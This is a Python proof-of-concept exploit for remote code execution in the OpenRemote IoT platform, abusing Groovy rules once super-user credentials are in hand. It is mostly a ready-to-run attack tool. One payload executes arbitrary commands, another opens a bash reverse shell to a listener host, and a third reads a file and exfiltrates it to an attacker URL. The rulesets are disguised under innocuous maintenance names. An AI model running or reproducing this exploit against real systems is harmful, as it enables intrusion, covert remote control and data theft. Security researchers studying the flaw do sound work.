#!/usr/bin/env python3
"""
OpenRemote RCE via Groovy Rules - Proof of Concept
Target: OpenRemote IoT Platform
Vulnerability: Remote Code Execution via GroovyShell (Incomplete Sandbox)
Severity: CRITICAL (CVSS 8.4 - requires super-user)

Requirements:
- Super-user credentials
- Python 3.x with requests library

Usage:
    python3 openremote_rce_groovy.py --target http://localhost:8080 --realm master \
        --user admin --password secret --command "whoami"
"""

import argparse
import requests
import sys
import urllib3
from typing import Optional, Dict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class OpenRemoteGroovyRCE:
    def __init__(self, target: str, realm: str, verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.realm = realm
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.access_token: Optional[str] = None
        
    def authenticate(self, username: str, password: str) -> bool:
        """Authenticate with OpenRemote"""
        auth_url = f"{self.target}/auth/realms/{self.realm}/protocol/openid-connect/token"
        
        data = {
            "grant_type": "password",
            "client_id": "openremote",
            "username": username,
            "password": password
        }
        
        try:
            response = self.session.post(auth_url, data=data, verify=self.verify_ssl)
            if response.status_code == 200:
                self.access_token = response.json().get("access_token")
                print(f"[+] Authentication successful!")
                return True
            print(f"[-] Authentication failed: {response.status_code}")
            return False
        except Exception as e:
            print(f"[-] Auth error: {e}")
            return False
    
    def _get_headers(self) -> Dict[str, str]:
        return {
            "Authorization": f"Bearer {self.access_token}",
            "Content-Type": "application/json"
        }
    
    def create_rce_ruleset(self, command: str) -> bool:
        """Create Groovy ruleset with RCE payload"""
        
        # Groovy payload - execute() is a GString method that runs system commands
        groovy_payload = f'''
// Groovy RCE Payload
def cmd = "{command}"
def proc = cmd.execute()
def output = proc.text

// Log output (can also exfil via HTTP)
LOG.info("Command output: " + output)

// Define rule
rules.when {{
    true
}}.then {{
    // Executed on trigger
}}
'''
        
        # Global ruleset (super-user only)
        ruleset_data = {
            "name": "System-Maintenance-Script",
            "enabled": True,
            "lang": "GROOVY",
            "rules": groovy_payload
        }
        
        url = f"{self.target}/api/rules/global"
        
        try:
            response = self.session.post(
                url,
                headers=self._get_headers(),
                json=ruleset_data,
                verify=self.verify_ssl
            )
            
            if response.status_code in [200, 201]:
                ruleset_id = response.json()
                print(f"[+] Groovy RCE ruleset created!")
                print(f"[+] Ruleset ID: {ruleset_id}")
                print(f"[+] Command: {command}")
                return True
            elif response.status_code == 403:
                print(f"[-] Access Denied - Super-user required for Groovy rules")
                return False
            else:
                print(f"[-] Failed: {response.status_code}")
                print(f"[-] Response: {response.text[:300]}")
                return False
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def create_reverse_shell(self, lhost: str, lport: int) -> bool:
        """Create Groovy reverse shell"""
        
        groovy_payload = f'''
// Groovy Reverse Shell
def sout = new StringBuilder(), serr = new StringBuilder()
def cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"]
def proc = cmd.execute()

rules.when {{ true }}.then {{ }}
'''
        
        ruleset_data = {
            "name": "System-Update-Service",
            "enabled": True, 
            "lang": "GROOVY",
            "rules": groovy_payload
        }
        
        try:
            response = self.session.post(
                f"{self.target}/api/rules/global",
                headers=self._get_headers(),
                json=ruleset_data,
                verify=self.verify_ssl
            )
            
            if response.status_code in [200, 201]:
                print(f"[+] Reverse shell ruleset created!")
                print(f"[+] Start listener: nc -lvnp {lport}")
                return True
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def create_file_reader(self, filepath: str, exfil_url: str) -> bool:
        """Read file and exfiltrate contents"""
        
        groovy_payload = f'''
// Read file and exfiltrate
def content = new File("{filepath}").text
def encoded = content.bytes.encodeBase64().toString()

// HTTP exfiltration
def url = new URL("{exfil_url}?data=" + java.net.URLEncoder.encode(encoded, "UTF-8"))
def conn = url.openConnection()
conn.getInputStream().close()

rules.when {{ true }}.then {{ }}
'''
        
        ruleset_data = {
            "name": "Config-Backup-Service",
            "enabled": True,
            "lang": "GROOVY",
            "rules": groovy_payload
        }
        
        try:
            response = self.session.post(
                f"{self.target}/api/rules/global",
                headers=self._get_headers(),
                json=ruleset_data,
                verify=self.verify_ssl
            )
            
            if response.status_code in [200, 201]:
                print(f"[+] File reader ruleset created!")
                print(f"[+] File: {filepath}")
                print(f"[+] Exfiltrating to: {exfil_url}")
                return True
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False


def main():
    parser = argparse.ArgumentParser(description="OpenRemote RCE via Groovy Rules (Super-User)")
    
    parser.add_argument("--target", "-t", required=True, help="Target URL")
    parser.add_argument("--realm", "-r", default="master", help="Realm")
    parser.add_argument("--user", "-u", required=True, help="Super-user username")
    parser.add_argument("--password", "-p", required=True, help="Password")
    parser.add_argument("--command", "-c", help="Command to execute")
    parser.add_argument("--reverse-shell", action="store_true", help="Reverse shell mode")
    parser.add_argument("--lhost", help="Listener host")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port")
    parser.add_argument("--read-file", help="File path to read")
    parser.add_argument("--exfil", help="Exfiltration URL")
    parser.add_argument("--insecure", "-k", action="store_true")
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║      OpenRemote RCE via Groovy Rules - PoC Exploit            ║
    ║              (Requires Super-User Account)                    ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    exploit = OpenRemoteGroovyRCE(args.target, args.realm, not args.insecure)
    
    print(f"[*] Authenticating as {args.user}...")
    if not exploit.authenticate(args.user, args.password):
        sys.exit(1)
    
    if args.reverse_shell:
        if not args.lhost:
            print("[-] --lhost required")
            sys.exit(1)
        exploit.create_reverse_shell(args.lhost, args.lport)
    elif args.read_file and args.exfil:
        exploit.create_file_reader(args.read_file, args.exfil)
    elif args.command:
        exploit.create_rce_ruleset(args.command)
    else:
        print("[-] Specify --command, --reverse-shell, or --read-file with --exfil")
        sys.exit(1)


if __name__ == "__main__":
    main()
